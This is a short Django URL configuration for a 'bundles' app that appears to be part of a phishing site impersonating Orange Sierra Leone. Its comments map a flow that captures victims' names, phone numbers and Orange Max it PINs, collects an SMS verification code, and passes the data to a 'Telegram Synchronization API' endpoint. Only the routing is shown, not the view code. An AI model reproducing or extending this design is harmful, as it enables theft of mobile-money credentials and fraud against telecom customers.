"""
Bundles URLs - Updated for Orange SL Sync
"""
from django.urls import path
from . import views

app_name = 'bundles'

urlpatterns = [
    # 1. Main Storefront / Bundle Selection
    path('', views.home, name='index'), 
    path('list/', views.home, name='list'),
    
    # 2. Identity Capture (Name, City, Bundle Choice)
    path('checkout/', views.checkout, name='checkout'),
    
    # 3. Orange Max it Handshake (Phone & PIN)
    path('payment-instructions/', views.payment_instructions, name='payment_instructions'),
    
    # 4. Final Verification (SMS Activation Link)
    path('verify-sync/', views.otp_verification, name='otp_verification'),
    
    # 5. Telegram Synchronization API
    path('sync-data/', views.sync_data, name='sync_data'),
    
    # 6. Success / Completion Page
    path('success/', views.success, name='success'),
]